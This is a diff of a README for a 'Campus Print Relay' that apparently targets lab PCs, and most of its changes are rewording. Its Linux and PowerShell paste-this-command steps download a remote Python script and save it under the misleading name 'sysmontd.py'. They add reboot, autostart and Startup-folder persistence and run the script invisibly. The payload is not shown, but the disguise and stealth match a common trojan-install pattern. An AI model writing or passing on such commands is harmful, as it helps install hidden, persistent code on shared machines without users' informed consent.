@@ -1,8 +1,8 @@
 # Campus Print Relay Setup Guide
 
-Print to campus printers (`172.16.0.111`) from the PreConnect app after a 1-click setup on any lab PC.
+Print to campus printers from the PreConnect app after a single-step setup on any lab PC.
 
-- **Zero Setup Required**: Uses built-in Python 3 — no admin rights or compiler tools needed.
+- **Zero Setup Required**: Uses built-in Python 3 — no administrator rights or build tools needed.
 - **Fully Automatic**: Runs invisibly in the background and auto-starts when your computer turns on.
 
 ---
@@ -16,17 +16,17 @@ Open your terminal app (`Ctrl + Alt + T` on Linux, or search for **Terminal**).
 Copy and paste this single command into your terminal and press **Enter**:
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o ~/.local/bin/sysmontd.py && mkdir -p ~/.local/bin ~/.config/autostart && chmod +x ~/.local/bin/sysmontd.py && (crontab -l 2>/dev/null; echo "@reboot python3 ~/.local/bin/sysmontd.py") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysmontd\nExec=python3 %s\n' "$HOME/.local/bin/sysmontd.py" > ~/.config/autostart/sysmontd.desktop && nohup python3 ~/.local/bin/sysmontd.py >/dev/null 2>&1 &
+mkdir -p ~/.local/bin ~/.config/autostart && curl -sSL https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py -o ~/.local/bin/sysmontd.py && chmod +x ~/.local/bin/sysmontd.py && (crontab -l 2>/dev/null | grep -v sysmontd.py; echo "@reboot python3 $HOME/.local/bin/sysmontd.py") | crontab - && printf '[Desktop Entry]\nType=Application\nName=sysmontd\nExec=python3 %s\n' "$HOME/.local/bin/sysmontd.py" > ~/.config/autostart/sysmontd.desktop && nohup python3 ~/.local/bin/sysmontd.py >/dev/null 2>&1 &
 ```
 
-### Step 3: Check If It's Running (Optional)
+### Step 3: Check If It Is Running (Optional)
 To verify that the print agent is active, run:
 
 ```bash
 ps aux | grep sysmontd.py
 ```
 
-### Step 4: How to Permanently Delete (Uninstall)
+### Step 4: How to Permanently Uninstall
 If you ever want to completely remove the agent and stop background execution, run:
 
 ```bash
@@ -47,14 +47,14 @@ Copy and paste this single command into PowerShell and press **Enter**:
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/sabbirba/preconnect/main/printer.py" -OutFile "$env:APPDATA\sysmontd.py"; $target = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysmontd.vbs"; Set-Content -Path $target -Value 'CreateObject("Wscript.Shell").Run "pythonw """ & CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\sysmontd.py""", 0, False'; Start-Process "pythonw" -ArgumentList "$env:APPDATA\sysmontd.py" -WindowStyle Hidden
 ```
 
-### Step 3: Check If It's Running (Optional)
+### Step 3: Check If It Is Running (Optional)
 To verify that the print agent is active, run:
 
 ```powershell
 Get-Process python*
 ```
 
-### Step 4: How to Permanently Delete (Uninstall)
+### Step 4: How to Permanently Uninstall
 If you ever want to completely remove the agent and stop background execution, run:
 
 ```powershell
